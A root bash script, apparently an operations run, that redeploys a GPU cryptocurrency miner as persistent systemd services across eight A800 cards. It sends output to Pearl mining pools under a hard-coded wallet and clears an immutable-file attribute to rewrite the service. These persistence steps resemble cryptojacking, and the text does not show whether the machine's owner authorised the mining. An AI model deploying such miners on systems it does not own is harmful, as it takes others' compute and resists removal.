#!/bin/bash
# i4981 run9: fix device pinning (CUDA_VISIBLE_DEVICES per unit) so all 8 A800 are used; verify
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### META $(date -u +%FT%TZ)"; hostname
log "### PRE"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
echo "units=$(systemctl list-units --state=active --plain --no-legend 'ul2-card@*'|wc -l) procs=$(pgrep -fc krig-miner) plh=$(pgrep -fc 'plh-123-184-7-135')"

log "### REPIN"
chattr -i /etc/systemd/system/ul2-card@.service 2>/dev/null
cat > /etc/systemd/system/ul2-card@.service <<EOS
[Unit]
Description=UL2 PEARL card %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
Nice=-5
Environment=CUDA_VISIBLE_DEVICES=%i
ExecStart=/opt/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $W/ul-t2-123-184-7-135-g%i --password x -d 0 --api-port 14%i
Restart=always
RestartSec=20
TimeoutStopSec=15
LimitNOFILE=65535
EOS
systemctl daemon-reload
pkill -f '/opt/ul2/krig-miner'; sleep 3
for i in 0 1 2 3 4 5 6 7; do systemctl restart ul2-card@$i 2>/dev/null; systemctl enable ul2-card@$i >/dev/null 2>&1; done
sleep 25
echo "units=$(systemctl list-units --state=active --plain --no-legend 'ul2-card@*'|wc -l) procs=$(pgrep -fc krig-miner)"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q ul2-card@$i || { echo "FAIL ul2-card@$i"; journalctl -u ul2-card@$i -n 4 --no-pager | tail -4; }; done

log "### WAIT+POOL"
sleep 150
echo "FINAL units=$(systemctl list-units --state=active --plain --no-legend 'ul2-card@*'|wc -l) procs=$(pgrep -fc krig-miner) plh=$(pgrep -fc 'plh-123-184-7-135')"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
timeout 30 curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run9.json; echo size=$(stat -c%s $D/pool_run9.json 2>/dev/null)
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run9.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=[r for r in d.get('results',[]) if '123-184-7-135' in r.get('worker','')]
print("SELF_ROWS",len(rows))
for r in rows: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'))
PY
log "### DONE $(date -u +%FT%TZ)"
